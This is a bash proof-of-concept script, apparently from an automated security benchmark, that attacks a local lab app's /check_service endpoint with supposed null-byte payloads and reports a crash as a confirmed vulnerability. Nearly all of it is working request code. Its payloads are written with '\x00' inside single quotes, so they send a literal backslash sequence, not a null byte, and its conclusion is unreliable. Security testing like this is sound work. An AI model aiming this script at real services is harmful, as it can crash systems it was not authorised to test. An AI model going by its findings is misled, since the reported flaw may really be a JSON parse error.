#!/bin/bash
# POC: Demonstrates null byte injection in /check_service endpoint causing HTTP 500 error and application crash
# Target: ./repo
# Created: 2025-11-07T17:22:04.109Z
# Session: benchmark-XBEN-068-24-mhp49w3p

# Null Byte Injection POC for /check_service endpoint
# This script demonstrates how null bytes in the service_name parameter
# cause the application to crash with a 500 error
# Usage: ./poc.sh [target_url] (default: http://localhost:5000)

TARGET_URL="${1:-http://localhost:5000}"
ENDPOINT="/check_service"
FULL_URL="${TARGET_URL}${ENDPOINT}"

echo "================================================"
echo "Null Byte Injection POC - /check_service"
echo "================================================"
echo "Target: ${FULL_URL}"
echo ""

# Check connectivity first
echo "[*] Testing connectivity..."
curl -s -m 2 "${TARGET_URL}" > /dev/null 2>&1
if [ $? -ne 0 ]; then
  echo "    [!] Warning: Could not reach ${TARGET_URL}"
  echo "    [!] Make sure the target application is running"
fi
echo ""

# Test 1: Null byte at end of service name
echo "[*] Test 1: Null byte at end of service name"
echo "    Payload: service_name=apache with null byte appended"
echo "    Command: curl -X POST -H 'Content-Type: application/json' -d '{\"service_name\": \"apache\x00\"}' ${FULL_URL}"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
  -H "Content-Type: application/json" \
  "${FULL_URL}" \
  --data-binary '{"service_name": "apache\x00"}' 2>&1)

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "    Response Status: $HTTP_CODE"
if [ ! -z "$BODY" ]; then
  echo "    Response Body: $BODY"
fi

if [ "$HTTP_CODE" = "500" ]; then
  echo "    [✓] VULNERABLE: Null byte at end caused 500 error"
  VULN_FOUND=1
elif [ "$HTTP_CODE" = "000" ]; then
  echo "    [!] Connection failed - target may not be running"
else
  echo "    [×] Unexpected status code"
fi
echo ""

# Test 2: Null byte at start of service name
echo "[*] Test 2: Null byte at start of service name"
echo "    Payload: service_name with null byte prepended"
echo "    Command: curl -X POST -H 'Content-Type: application/json' -d '{\"service_name\": \"\x00apache\"}' ${FULL_URL}"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
  -H "Content-Type: application/json" \
  "${FULL_URL}" \
  --data-binary '{"service_name": "\x00apache"}' 2>&1)

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "    Response Status: $HTTP_CODE"
if [ ! -z "$BODY" ]; then
  echo "    Response Body: $BODY"
fi

if [ "$HTTP_CODE" = "500" ]; then
  echo "    [✓] VULNERABLE: Null byte at start caused 500 error"
  VULN_FOUND=1
elif [ "$HTTP_CODE" = "000" ]; then
  echo "    [!] Connection failed - target may not be running"
else
  echo "    [×] Unexpected status code"
fi
echo ""

# Test 3: Normal request (baseline)
echo "[*] Test 3: Baseline - Normal request without null byte"
echo "    Payload: service_name=apache"
echo "    Command: curl -X POST -H 'Content-Type: application/json' -d '{\"service_name\": \"apache\"}' ${FULL_URL}"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
  -H "Content-Type: application/json" \
  "${FULL_URL}" \
  -d '{"service_name": "apache"}' 2>&1)

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "    Response Status: $HTTP_CODE"
if [ ! -z "$BODY" ]; then
  echo "    Response Body: $BODY"
fi
echo ""

echo "================================================"
echo "Result Summary:"
if [ ! -z "$VULN_FOUND" ]; then
  echo "[✓] Vulnerability Confirmed: Null byte injection causes 500 error"
  echo "    The endpoint crashes when null bytes are included in parameters"
else
  echo "[!] Could not confirm vulnerability"
  echo "    Ensure target application is running at: ${TARGET_URL}"
fi
echo "================================================"

exit 0